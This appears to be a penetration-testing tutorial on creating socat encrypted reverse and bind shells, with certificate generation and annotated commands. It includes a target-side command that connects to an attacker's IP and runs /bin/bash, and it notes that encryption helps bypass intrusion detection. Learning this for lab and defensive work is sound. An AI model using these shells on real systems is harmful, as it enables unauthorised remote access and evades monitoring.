## Introduction
- One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse.
- Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.

**Note** - We covered how to create basic shells in the previous task, so that syntax will not be covered again here. Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells.

**We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:**
```python
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
- `openssl`: This is a command-line tool for working with SSL/TLS certificates and keys.
- `req`: This option tells OpenSSL to generate a certificate signing request (CSR) and a self-signed certificate.
    
- `--newkey rsa:2048`: This generates a new RSA key of 2048 bits (a type of cryptographic key).
    
- `-nodes`: This option specifies that the generated private key should not be encrypted with a passphrase. It means the key will not require a password to be used.
    
- `-keyout shell.key`: This specifies the filename where the generated private key will be saved. In this case, it will be saved in a file named "shell.key."
    
- `-x509`: This option tells OpenSSL to create a self-signed certificate instead of a certificate signing request.
    
- `-days 362`: This sets the validity period of the self-signed certificate to 362 days, which is just under a year.
    
- `-out shell.crt`: This specifies the filename where the generated self-signed certificate will be saved. In this case, it will be saved in a file named "shell.crt."
The command will prompt you to provide some information for the certificate (like country, organization, etc.), but you can leave them blank or fill them randomly if you wish.

**We then need to merge the two created files into a single `.pem` file:**
```python
cat shell.key shell.crt > shell.pem
```
- `cat`: This is a command that concatenates (combines) files together.
    
- `shell.key shell.crt`: These are the names of the two files you want to combine: "shell.key" (the private key) and "shell.crt" (the self-signed certificate).
    
- `>`: This symbol redirects the output of the `cat` command to a new file.
`.pem` is a common format for storing certificates and private keys.

#### Now, when we set up our reverse shell listener, we use:
```python
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
- `socat`: This is the command itself, used for establishing bidirectional data streams between two endpoints.
    
- `OPENSSL-LISTEN:<PORT>`: This part tells socat to listen on the specified `<PORT>` for incoming connections using the OpenSSL protocol.
    
- `cert=shell.pem`: This option specifies the SSL/TLS certificate file to be used for secure communication. In this case, the certificate file is named "shell.pem," which is the file we generated earlier using the `openssl` command.
    
- `verify=0`: This option sets the certificate verification level. In this case, `verify=0` means that certificate verification is turned off, and the client connecting to this socat listener will not need to present a valid certificate.
    
- `-`: The hyphen at the end represents that socat should send the data received from the incoming connection to the standard output (stdout) of the terminal.

**To connect back, we would use:**
```python
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

#### The same technique would apply for a bind shell:
Target:
```python
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

Attacker:
```python
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

**Note** - for a Windows target, the certificate must be used with the listener.

## Below example
- The following image shows an OPENSSL Reverse shell from a Linux target.
- As usual, the target is on the right, and the attacker is on the left:
